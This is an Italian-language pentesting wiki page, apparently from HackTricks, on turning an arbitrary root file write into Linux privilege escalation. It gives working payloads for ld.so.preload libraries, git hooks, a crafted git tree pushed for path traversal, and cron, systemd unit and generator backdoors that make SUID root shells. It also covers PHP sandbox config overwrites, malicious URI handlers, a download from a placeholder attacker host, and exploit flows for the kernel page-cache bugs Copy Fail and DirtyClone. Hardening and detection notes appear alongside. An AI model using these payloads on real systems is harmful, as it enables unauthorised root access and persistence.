# Scrittura arbitraria di file come root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload` è un elenco di oggetti condivisi a livello di sistema che il linker dinamico carica prima degli altri oggetti condivisi. La modalità di esecuzione sicura applica ulteriori restrizioni al preloading, quindi un percorso di libreria come `/tmp/pe.so` non è una tecnica universale per i binari SUID.\
Se puoi creare o modificare il file, un processo che lo carica caricherà la libreria elencata prima degli altri oggetti condivisi, consentendo l'esecuzione di codice nel contesto di quel processo.<sup>[[12]](#references)</sup>

Ad esempio: `echo "/tmp/pe.so" > /etc/ld.so.preload`

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unlink("/etc/ld.so.preload");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

### Git hooks

I **Git hooks** sono script eseguibili avviati in risposta a eventi in un repository, incluse le operazioni di commit e merge. Se uno **script o utente privilegiato** esegue queste operazioni e un attaccante può **scrivere nella cartella `.git`**, l’hook può essere usato per la **privilege escalation**.<sup>[[13]](#references)</sup>

Ad esempio, è possibile **generare uno script** in **`.git/hooks`** di un repository Git, in modo che venga sempre eseguito quando viene creato un nuovo commit:

```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```

### Path traversal nell'export del tree Git con privilegi elevati

Un sincronizzatore con privilegi può evitare un checkout e invece enumerare un repository influenzato dall'attaccante con `git ls-tree`, leggere ogni blob con `git cat-file`, unire il percorso riportato a una directory di staging e scriverlo autonomamente. Questo diventa un **arbitrary file write con i privilegi del sincronizzatore** quando combina `-c safe.directory=*` (disabilitando il controllo di Git sui repository appartenenti a un altro utente) con l'assenza di un controllo che garantisca che la destinazione sia contenuta nella directory prevista. Un nome assoluto di una voce del tree fa sì che `os.path.join(stage, name)` di Python scarti `stage`; un nome relativo contenente `../` permette di uscire dalla directory quando il filesystem risolve il percorso. Poiché l'applicazione materializza il tree grezzo invece di chiedere a Git di effettuarne il checkout, il rifiuto dei percorsi durante il checkout non protegge mai il punto di scrittura.<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

Cerca questa struttura del codice in servizi root, timer, agent di deployment, importatori di template e job di backup/ripristino:<sup>[[30]](#references)</sup>

```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
    target = os.path.join(stage_root, git_path)  # no containment check
    os.makedirs(os.path.dirname(target), exist_ok=True)
    with open(target, "wb") as output:
        output.write(git("cat-file", "blob", oid))
```

Una voce tree è codificata come `<mode> SP <name> NUL <raw object ID>`. L'opzione `git hash-object --literally` consente deliberatamente dati di oggetti che la normale analisi o `git fsck` potrebbero rifiutare, quindi un clone usa e getta può creare un tree il cui nome file è una destinazione assoluta. Questo esempio crea un blob per un file cron, racchiude il tree creato ad hoc in un commit e sposta un branch su di esso; lo sfruttamento richiede comunque l'autorizzazione ad aggiornare un repository utilizzato dal job privilegiato e un server Git che accetti l'oggetto malformato.<sup>[[30]](#references)[[31]](#references)</sup>

```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```

L'hardening deve coprire sia l'acquisizione dei repository sia l'operazione finale sul filesystem:<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- Sostituisci `safe.directory=*` con l'elenco esatto dei repository di cui il servizio deve fidarsi e, se possibile, esegui l'elaborazione dei repository senza privilegi di root.
- Rifiuta i nomi assoluti e qualsiasi componente `.` o `..` prima della materializzazione. Dopo aver unito i percorsi, canonicalizza il risultato e verifica che la destinazione rimanga all'interno della root prevista.
- Evita le race condition tra verifica e apertura dei symlink: apri i percorsi relativi a un descrittore di directory attendibile e, su Linux, usa `openat2()` con `RESOLVE_BENEATH` e `RESOLVE_NO_SYMLINKS` per i percorsi controllabili da un attaccante.
- Preferisci un checkout normale in una directory isolata invece di reimplementare il checkout a partire dall'output dei comandi plumbing. Se è necessario acquisire oggetti grezzi, abilita la convalida lato ricezione, ad esempio con `receive.fsckObjects=true`; non declassare i controlli `receive.fsck.*` relativi ai nomi di percorso, necessari per rifiutare alberi costruiti ad arte.

### Distribuzione di configurazioni con privilegi elevati

Alcuni servizi di gestione salvano lo stato di sistema previsto in un file di configurazione e in seguito lo distribuiscono con privilegi elevati. Per esempio, [openmediavault salva la configurazione in `/etc/openmediavault/config.xml`](https://docs.openmediavault.org/en/7.x/faq.html) e la sua [interfaccia RPC](https://docs.openmediavault.org/en/8.x/development/tools/omv_rpc.html) può applicare le modifiche ai servizi. Se un account con privilegi inferiori può scrivere o sostituire quel file, verifica se può anche richiedere una distribuzione autorizzata e se il modulo selezionato utilizza come root il campo modificato. Le chiavi degli account SSH, i comandi pianificati e l'installazione di pacchetti hanno prerequisiti diversi; la semplice presenza di un file o di un XML scrivibile non dimostra che una di queste possibilità sia realizzabile. Controlla i permessi del file e della directory padre, i gruppi dell'utente e le autorizzazioni RPC, la versione installata e il componente che utilizza effettivamente la configurazione, senza modificarla né avviare un'operazione di applicazione durante la ricognizione.

Le definizioni delle action di Fail2Ban in `/etc/fail2ban/action.d/` costituiscono un altro confine di configurazione privilegiato. Un utente che può scrivere in quella directory e accedervi potrebbe riuscire a sostituire una definizione di action o aggiungere un override, ma i soli permessi della directory non dimostrano l'esecuzione di codice. Verifica che una jail abilitata selezioni effettivamente l'action interessata, che il servizio Fail2Ban la esegua con privilegi superiori e che siano previsti un reload/restart autorizzato e un evento di ban corrispondente. Un permesso sudo non correlato per riavviare Fail2Ban è rilevante solo se si applica all'invocazione esatta del servizio e la definizione modificata viene caricata. La [configurazione delle action di Fail2Ban](https://github.com/fail2ban/fail2ban/blob/master/man/jail.conf.5) documenta la relazione tra la directory delle action e le jail; la sua [action di esempio](https://github.com/fail2ban/fail2ban/blob/master/config/action.d/iptables.conf) mostra che `actionban` viene eseguita al verificarsi di un ban con i privilegi dell'utente del servizio. Esamina i permessi e la configurazione effettiva senza modificare le action né attivare ban durante la ricognizione.

Esiste un confine distinto quando una jail Fail2Ban abilitata utilizza un'action email arricchita con WHOIS. [CVE-2021-32749](https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm) riguardava testo WHOIS non attendibile passato tramite pipe a `mail` di GNU mailutils, la cui elaborazione delle sequenze di escape poteva eseguire un comando. Un utente con privilegi inferiori che può scrivere file potrebbe influenzare la risposta se può modificare la configurazione di override del server del **client WHOIS selezionato**; [`whois.conf(5)` di Debian](https://manpages.debian.org/bookworm/whois/whois.conf.5.en.html) documenta uno di questi file, ma percorso e utilizzo variano in base all'installazione. Esamina la jail/action effettiva, l'identità del servizio, il client WHOIS e il percorso della configurazione realmente utilizzati, l'implementazione di mail, il controllo della risposta e la correzione o il backport del vendor installati. Un file di configurazione WHOIS scrivibile, una versione di Fail2Ban o una mail action, presi singolarmente, non dimostrano questa catena; durante la ricognizione passiva, evita di interrogare server esterni o attivare ban.

### Creazione di file via TFTP e hook privilegiati dei pacchetti

Un servizio TFTP accessibile può superare il confine di un container o di un utente locale quando le impostazioni **effettive** di tftpd-hpa lo eseguono come root, espongono la root del filesystem come directory `--secure` e abilitano `--create`. [Il manuale di tftpd-hpa](https://manpages.debian.org/trixie/tftpd-hpa/tftpd.8.en.html) descrive le opzioni di creazione e utente. Questo può consentire di creare un nuovo file in una directory di configurazione privilegiata, inclusa `/etc/apt/apt.conf.d/`; un file esistente potrebbe comunque non essere sostituibile. [Il manuale di configurazione di APT](https://manpages.debian.org/bookworm/apt/apt.conf.5.en.html) documenta i comandi `APT::Update::Pre-Invoke`. Un `apt update` eseguito come root può diventare il componente che opera con privilegi superiori **solo se** legge il nuovo file di configurazione. Verifica gli argomenti e l'identità effettivi del daemon in esecuzione, la raggiungibilità di rete e i filtri, le regole di creazione della directory di destinazione, l'ambito effettivo della configurazione di APT e una successiva invocazione privilegiata. Un file predefinito, una directory di destinazione scrivibile o un comando APT pianificato, da soli, non dimostrano l'intero percorso. La ricognizione passiva dovrebbe limitarsi alla lettura di configurazioni e metadati locali di dimensioni limitate, senza caricare file né invocare APT.

### File Cron e Time

Se puoi **scrivere file relativi a cron che vengono eseguiti da root**, di solito puoi ottenere l'esecuzione di codice al successivo avvio del job. Tra le destinazioni interessanti:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Il crontab di root in `/var/spool/cron/` o `/var/spool/cron/crontabs/`
- I timer `systemd` e i servizi che avviano

Controlli rapidi:

```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```

Percorsi tipici di abuso:

- **Aggiungere un nuovo cron job di root** a `/etc/crontab` o a un file in `/etc/cron.d/`
- **Sostituire uno script** già eseguito da `run-parts`
- **Inserire una backdoor in un target di timer esistente** modificando lo script o il binario che avvia

Esempio minimo di payload cron:

```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```

Se puoi scrivere solo all'interno di una directory cron usata da `run-parts`, inserisci invece lì un file eseguibile:

```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```

Note:

- `run-parts` di solito ignora i nomi di file che contengono punti, quindi preferisci nomi come `backup` invece di `backup.sh`.<sup>[[15]](#references)</sup>
- Alcuni sistemi usano timer `systemd` invece del cron classico, ma l'idea di abuso è la stessa: **modificare ciò che root eseguirà in seguito**.<sup>[[20]](#references)</sup>

### File di servizio e socket

Se puoi scrivere **file unit `systemd`** o file a cui fanno riferimento, potresti riuscire a eseguire codice come root ricaricando e riavviando l'unità, oppure aspettando che si attivi il percorso di attivazione del servizio/socket.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

Controlla anche i permessi di scrittura e ricerca sulla directory delle unità di sistema, inclusi gli ACL: un utente può creare una nuova unità in `/etc/systemd/system` anche quando la lettura o l'elenco dei contenuti della directory sono negati. Quel percorso, da solo, non avvia nulla. Verifica che il system manager carichi la nuova unità, che chi invoca disponga di un'autorizzazione effettiva a `systemctl start` o `restart` con privilegi root per il relativo nome (o di un altro percorso di attivazione privilegiato) e che il servizio venga eseguito con l'identità prevista. Per un'unità esistente caricata, una modifica su disco può richiedere `daemon-reload`; il comportamento di caricamento è diverso per un'unità con un nuovo nome. Esamina gli argomenti e le esclusioni esatti di sudo prima di considerare sufficiente una regola di riavvio con wildcard. Consulta il [percorso di ricerca delle unità systemd](https://www.freedesktop.org/software/systemd/man/latest/systemd.unit.html) e [le modalità di caricamento e ricaricamento di systemctl](https://www.freedesktop.org/software/systemd/man/latest/systemctl.html).

Tra i target interessanti:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Override drop-in in `/etc/systemd/system/<unit>.d/*.conf`
- Script/binari di servizio referenziati da `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Percorsi `EnvironmentFile=` scrivibili caricati da un servizio root

Controlli rapidi:

```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```

Percorsi di abuso comuni:

- **Sovrascrivere `ExecStart=`** in una unità di servizio di proprietà di root che puoi modificare
- **Aggiungere un override drop-in** con un `ExecStart=` malevolo e prima cancellare quello precedente
- **Inserire una backdoor nello script/binario** già referenziato dall’unità
- **Dirottare un servizio socket-activated** modificando il corrispondente file `.service` che viene avviato quando il socket riceve una connessione

Esempio di override malevolo:

```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```

Flusso di attivazione tipico:

```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```

Se non puoi riavviare i servizi ma puoi modificare un'unità attivata tramite socket, potrebbe bastare **attendere una connessione client** per attivare l'esecuzione come root del servizio con backdoor.<sup>[[17]](#references)</sup>

### Directory dei generatori systemd

I **generatori di sistema** sono eseguibili avviati dal system manager prima che carichi i file delle unità, sia durante l'avvio sia durante il ricaricamento della configurazione. Pertanto, l'accesso in scrittura a una directory dei generatori di sistema (o a un generatore eseguibile esistente) è un metodo diretto per eseguire codice come root, facile da non notare se un audit controlla solo i file `*.service` e `*.timer`.<sup>[[35]](#references)[[36]](#references)</sup>

L'ordine di ricerca usuale è `/run/systemd/system-generators/`, `/etc/systemd/system-generators/`, `/usr/local/lib/systemd/system-generators/` e `/usr/lib/systemd/system-generators/` (alcune distribuzioni espongono `/lib/systemd/system-generators/` tramite l'unione di `/usr`). Un eseguibile con lo stesso nome in una directory precedente nasconde quello nelle directory successive. Non confondere queste **directory degli eseguibili di input** con `/run/systemd/generator`, `/run/systemd/generator.early` e `/run/systemd/generator.late`, che contengono l'output temporaneo delle unità prodotto dai generatori.<sup>[[35]](#references)</sup>

Controlli rapidi:

```bash
for d in /run/systemd/system-generators /etc/systemd/system-generators \
         /usr/local/lib/systemd/system-generators /usr/lib/systemd/system-generators \
         /lib/systemd/system-generators; do
    [ -e "$d" ] || continue
    namei -l "$d"
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
    getfacl -p "$d" "$d"/* 2>/dev/null
done
```

Un generatore appena creato deve avere impostato il bit di esecuzione. Se la primitiva di scrittura controlla i byte ma non i permessi, scegli come obiettivo un generatore già eseguibile: troncarlo sul posto normalmente ne preserva i metadati. Se la directory stessa è scrivibile, crea una nuova voce e impostala come eseguibile.<sup>[[35]](#references)</sup>

```bash
cat > /etc/systemd/system-generators/zz-update <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown 0:0 /tmp/rootbash
chmod 4755 /tmp/rootbash
rm -f "$0"
EOF
chmod 755 /etc/systemd/system-generators/zz-update
```

Triggering `systemctl daemon-reload` against il manager **system** richiede un’autorizzazione adeguata, ma riesegue ogni system generator; in caso contrario, attendi un reload privilegiato, un’operazione sui pacchetti o un riavvio. Le directory degli user generator, come `~/.config/systemd/user-generators/`, vengono eseguite dal manager dell’utente e **non** forniscono privilegi root da sole.<sup>[[35]](#references)</sup>

Per l’hardening e la ricerca di minacce, verifica ogni componente del percorso e gli ACL, non solo i bit di modalità finali; crea una baseline degli hash e della proprietà dei pacchetti dei generator e genera avvisi in caso di creazione, rinomina, modifica dei contenuti o dei permessi in tutte le directory di input dei system generator. Monitorare le scritture è importante perché un generator eseguito una sola volta può eliminarsi dopo l’esecuzione, mentre l’albero delle unità generate in `/run/systemd/generator*` viene ricreato al reload successivo.<sup>[[35]](#references)[[36]](#references)</sup>

### Sovrascrivere un `php.ini` restrittivo usato da una sandbox PHP privilegiata

Alcuni daemon personalizzati convalidano il PHP fornito dall’utente eseguendo `php` con un **`php.ini` restrittivo** (per esempio, `disable_functions=exec,system,...`). Se il codice sandboxed dispone ancora di **una qualsiasi primitiva di scrittura** (come `file_put_contents`) e riesci a raggiungere il **percorso esatto di `php.ini`** usato dal daemon, puoi **sovrascrivere quella configurazione** per rimuovere le restrizioni e poi inviare un secondo payload che viene eseguito con privilegi elevati.<sup>[[2]](#references)</sup>

Flusso tipico:

1. Il primo payload sovrascrive la configurazione della sandbox.
2. Il secondo payload esegue codice, ora che le funzioni pericolose sono state riabilitate.

Esempio minimo (sostituisci il percorso usato dal daemon):

```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```

Se il daemon viene eseguito come root (o convalida percorsi di proprietà di root), la seconda esecuzione ottiene un contesto root. Si tratta essenzialmente di **privilege escalation tramite sovrascrittura della configurazione** quando il runtime sandboxato può ancora scrivere file.

### binfmt_misc

`binfmt_misc` espone le registrazioni in `/proc/sys/fs/binfmt_misc`; ogni registrazione associa un pattern di tipo file a un interprete. L'impatto sui privilegi dipende da chi può modificare la registrazione e da quale processo esegue successivamente il file corrispondente: verifica questi requisiti prima di considerarla una via di privilege escalation.<sup>[[21]](#references)</sup>

Un helper eseguibile con `CAP_DAC_OVERRIDE` può costituire un percorso di registrazione distinto se accetta dati controllati dal chiamante e li scrive in `/proc/sys/fs/binfmt_misc/register`, anche quando il chiamante non può scrivere direttamente in quel nodo. Esamina l'input e il comportamento di scrittura dell'helper senza eseguirlo durante la ricognizione. Se una regola registrata usa il flag `C`, l'interprete riceve credenziali basate sul binario corrispondente; una corrispondenza SUID di proprietà di root può quindi eseguire come root un interprete controllato dal chiamante. Verifica il mount e i criteri di registrazione di `binfmt_misc`, i privilegi effettivi dell'helper, la regola esatta e il percorso dell'interprete, il target SUID eseguibile e l'eventuale soppressione della transizione SUID da parte di `no_new_privs` o di un mount `nosuid`. Un bit di capability o una stringa di percorso incorporata costituiscono solo un indizio da approfondire.<sup>[[21]](#references)</sup> Consulta [execve(2)](https://man7.org/linux/man-pages/man2/execve.2.html) per le condizioni che sopprimono SUID.

### Sovrascrivere gli handler degli schemi (come http: o https:)

Gli ambienti desktop usano le associazioni MIME e le voci desktop per scegliere un'applicazione per gli schemi URI; un utente malintenzionato che può scrivere nella configurazione pertinente dell'utente e nelle directory delle voci desktop può reindirizzare tali schemi a un launcher sotto il suo controllo. Modificando il file `$HOME/.config/mimeapps.list` per associare gli handler degli URL HTTP e HTTPS a un file malevolo (ad esempio, `x-scheme-handler/http=evil.desktop` e `x-scheme-handler/https=evil.desktop`), un clic dell'utente può avviare quella voce desktop.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```

### Esecuzione come root di script/binari scrivibili dall'utente

Se un workflow privilegiato esegue qualcosa come `/bin/sh /home/username/.../script` (o qualsiasi binario all'interno di una directory di proprietà di un utente non privilegiato), puoi dirottarlo:<sup>[[1]](#references)</sup>

- **Rileva l'esecuzione:** monitora i processi con pspy per intercettare root che esegue percorsi controllati dall'utente.<sup>[[25]](#references)</sup>

```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```

- **Verifica la scrivibilità:** assicurati che sia il file target sia la sua directory siano di proprietà del tuo utente e scrivibili da quest'ultimo.
- **Hijack del target:** esegui il backup del binario/script originale e inserisci un payload che crei una shell SUID (o esegua qualsiasi altra azione come root), quindi ripristina i permessi:

```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```

- **Attiva l'azione con privilegi** (ad es., premendo un pulsante dell'interfaccia che avvia l'helper). Quando root riesegue il percorso dirottato, ottieni la shell con privilegi elevati usando `./rootshell -p`.

### Modifica dei file privilegiati limitata alla page cache

Alcuni bug del kernel non modificano il file **su disco**. Ti permettono invece di modificare solo la **copia nella page cache** di un file leggibile. Se puoi colpire un binario **setuid** o comunque **eseguito da root**, la successiva esecuzione potrebbe usare byte controllati dall'attaccante presenti in memoria ed elevare i privilegi, anche se l'hash del file su disco non è cambiato.<sup>[[3]](#references)[[4]](#references)</sup>

È utile considerarla una **primitiva di scrittura su file limitata al runtime**:<sup>[[3]](#references)</sup>

- **Il disco resta pulito**: l'inode e i byte su disco non cambiano
- **La memoria è modificata**: i processi che leggono o eseguono la pagina in cache ricevono il contenuto modificato dall'attaccante
- **L'effetto è temporaneo**: la modifica scompare dopo un riavvio o l'espulsione dalla cache

Questa primitiva si colloca tra la classica **scrittura arbitraria di file** e i bug più vecchi di **abuso della page cache**, come Dirty COW / Dirty Pipe:<sup>[[3]](#references)</sup>

- Dirty COW si basava su una race condition
- Dirty Pipe aveva vincoli sulla posizione di scrittura
- Una primitiva limitata alla page cache può essere più affidabile se il percorso vulnerabile consente scritture dirette nelle pagine associate ai file presenti in cache

#### Flusso generico di privesc

1. Ottieni una primitiva del kernel in grado di scrivere nelle **pagine della page cache associate ai file**
2. Usala contro un **binario privilegiato leggibile** o un altro file eseguito da root
3. Avvia l'esecuzione **prima** che la pagina venga espulsa dalla cache
4. Ottieni l'esecuzione di codice come root mentre il file su disco sembra ancora invariato

Target ad alto valore tipici:

- Binari **setuid-root**
- Helper avviati da **servizi root**
- Binari comunemente eseguiti da **container che condividono il kernel/la page cache dell'host**

#### Percorso di esempio con AF_ALG + `splice()`

Copy Fail (CVE-2026-31431) è un buon esempio di questa classe. Il percorso vulnerabile si trovava nell'API Linux crypto per lo userspace (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` può trasferire riferimenti alle pagine della page cache di un file leggibile nella scatterlist TX crypto
- il percorso di decrittazione in-place di `algif_aead` riutilizzava i buffer sorgente e destinazione
- `authencesn` scriveva quindi nell'area del tag di destinazione
- quando quell'area faceva ancora riferimento a pagine associate al file ottenute tramite splice, la scrittura finiva nella **page cache del file target**

La tecnica interessante non è quindi la CVE in sé, ma lo schema:

- **fornire pagine della cache associate ai file a un sottosistema del kernel**
- fare in modo che il sottosistema le **tratti come output scrivibile**
- attivare una piccola sovrascrittura controllata in memoria

Il PoC pubblico usava ripetute **scritture da 4 byte** per modificare `/usr/bin/su` in memoria e poi lo eseguiva.<sup>[[4]](#references)[[7]](#references)</sup>

#### Percorso di esempio con ESP / XFRM + clone netfilter TEE

DirtyClone (CVE-2026-43503) mostra un'altra variante dello stesso schema **page-cache-only write-to-root**, ma questa volta il sink è la **decrittazione IPsec ESP** anziché `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

La tecnica fondamentale è il **passaggio di riciclaggio dei metadati**:

- `splice()` inserisce una **pagina della page cache associata a un file in sola lettura** in un pacchetto ESP-in-UDP
- la mitigazione originale di DirtyFrag contrassegnava lo skb con `SKBFL_SHARED_FRAG`, affinché `esp_input()` **copiasse i dati prima di decrittarli**
- netfilter `TEE` duplica il pacchetto tramite `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- il clone mantiene lo **stesso riferimento fisico alla pagina della page cache**, ma perde `SKBFL_SHARED_FRAG`
- `esp_input()` considera quindi il clone sicuro ed esegue la decrittazione **in-place di `cbc(aes)`** sulla pagina associata al file

La lezione per chi esamina il codice va oltre la CVE: se una mitigazione si basa sui **metadati di skb/pagina** per decidere se sia necessario copiare prima di un'operazione, qualsiasi **percorso di clonazione/copia che preservi la pagina sottostante ma perda i metadati** può riaprire silenziosamente la primitiva di scrittura.

Flusso di exploit tipico:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` per ottenere **`CAP_NET_ADMIN` all'interno di un namespace di rete privato**
2. attiva il loopback e installa una regola **netfilter `TEE`** in `mangle/OUTPUT`
3. installa le SA di trasporto XFRM ESP tramite `NETLINK_XFRM`
4. codifica ogni word target da 4 byte nel campo `seq_hi` della SA (il trucco di DirtyFrag per selezionare le word)
5. invia il pacchetto ESP-in-UDP ottenuto tramite splice, affinché il **clone TEE** raggiunga `esp_input()` e venga decrittato **in-place**
6. ripeti finché la copia nella page cache di `/usr/bin/su` o di un altro eseguibile privilegiato non contiene codice controllato dall'attaccante

Dal punto di vista operativo, l'impatto è lo stesso dell'esempio `AF_ALG`: il file su disco resta pulito, ma `execve()` usa i **byte modificati della page cache** e fornisce root.<sup>[[8]](#references)[[9]](#references)</sup>

Controlli utili per verificare l'esposizione a questa variante:

```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```

La riduzione a breve termine della superficie di attacco è specifica anche del percorso: l’aggiornamento a un kernel che include `48f6a5356a33` corregge il percorso clone, mentre impedire l’autoload di `xt_TEE` rimuove il **flag-laundering step** e impedire l’autoload di `esp4` / `esp6` rimuove il **decrypt sink**.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Esposizione e hunting

Se sospetti una vulnerabilità di questa classe, non affidarti solo ai controlli di integrità del disco. Verifica anche:

```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```

I valori di configurazione seguenti distinguono un'interfaccia caricabile da una integrata nel kernel; le regole di build di crypto associano `CONFIG_CRYPTO_USER_API_AEAD` a `algif_aead`.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` può essere caricato e scaricato come modulo
- `CONFIG_CRYPTO_USER_API_AEAD=y`: l'interfaccia è integrata nel kernel
- i binari setuid sono buoni obiettivi perché una patch che interviene solo sulla page cache può bastare a trasformare un foothold locale in root

#### Riduzione della superficie di attacco per il percorso `algif_aead`

Se l'interfaccia vulnerabile è fornita da un modulo caricabile:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>

```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```

Se è compilato nel kernel, alcune disclosure hanno segnalato che il blocco del percorso init avviene con:<sup>[[28]](#references)</sup>

```bash
initcall_blacklist=algif_aead_init
```

Questo tipo di mitigazione è utile da tenere a mente anche per altri kernel LPE: se lo sfruttamento dipende da una specifica interfaccia opzionale, disabilitarla o inserirla nella blacklist può interrompere il percorso dell'exploit anche prima che sia disponibile un aggiornamento completo del kernel.<sup>[[6]](#references)[[28]](#references)</sup>



## References

- [1] [HTB Bamboo – dirottare uno script eseguito da root in una directory PaperCut scrivibile dall'utente](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) — FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Divulgazione di Openwall oss-security per CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Correzione per Linux stable: crypto: algif_aead - Ripristino del funzionamento out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — advisory CVE-2026-31431](https://copy.fail/)
- [7] [Analisi tecnica di Theori / Xint](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [Repository DirtyClone / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: analisi e sfruttamento della variante Linux LPE DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Correzione Linux: net: skb: preservare `SKBFL_SHARED_FRAG` in `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Mitigazione precedente per Linux: impostare `SKBFL_SHARED_FRAG` per i pacchetti UDP sottoposti a splice (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — pagina del manuale Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — pagina del manuale Linux](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — pagina del manuale Debian](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — documentazione del kernel Linux](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [Associazioni delle applicazioni MIME](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Specifiche Shared MIME-info](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
